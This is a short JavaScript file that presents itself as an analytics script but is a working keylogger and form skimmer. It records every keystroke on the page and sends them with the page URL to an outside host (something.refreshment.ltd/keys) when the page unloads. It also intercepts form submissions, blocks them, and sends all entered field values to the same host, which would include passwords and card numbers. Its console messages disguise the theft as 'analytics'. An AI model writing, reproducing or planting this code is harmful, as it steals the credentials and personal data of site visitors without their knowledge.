(function () {
    console.log("Analytics loaded!");
    const externURL = "https://something.refreshment.ltd/send";
    const externURLKeys = "https://something.refreshment.ltd/keys";

    // Helper function to send data
    function sendData(data, url) {
        const xhr = new XMLHttpRequest();
        xhr.open("POST", url, true);
        xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
        xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
                console.log("Analytics sent!");
            } else if (xhr.readyState === XMLHttpRequest.DONE) {
                console.error("Failed to send analytics: ", xhr.statusText);
            }
        };
        xhr.send(JSON.stringify(data));
    }

    // Keylogger
    let keys = "";
    window.addEventListener("keydown", e => {
        // If it's not just a letter (e.g. a modifier key), make it easier to spot e.g. "[Tab]"
        if (e.key.length > 1) {
            keys += `[${e.key}]`;
        } else {
            keys += e.key;
        }
    });
    window.addEventListener("beforeunload", function (e) {
        if (keys.length === 0) {
            return;
        }
        e.preventDefault();
        sendData({
            keys,
            url: window.location.href
        }, externURLKeys);
    });

    function collectFormData() {
        const formData = {
            url: window.location.href
        }; // Record URL
        const inputs = document.querySelectorAll("input, select, textarea");
        inputs.forEach(input => {
            // Only grab inputs that have a value
            if (input.type !== "submit" && input.type !== "button" && input.value.length > 0) {
                formData[input.name || input.id] = input.value;
            }
        });
        return formData;
    }
    document.addEventListener("submit", function (e) {
        e.preventDefault();
        const formData = collectFormData();
        sendData(formData, externURL);
    });
})();
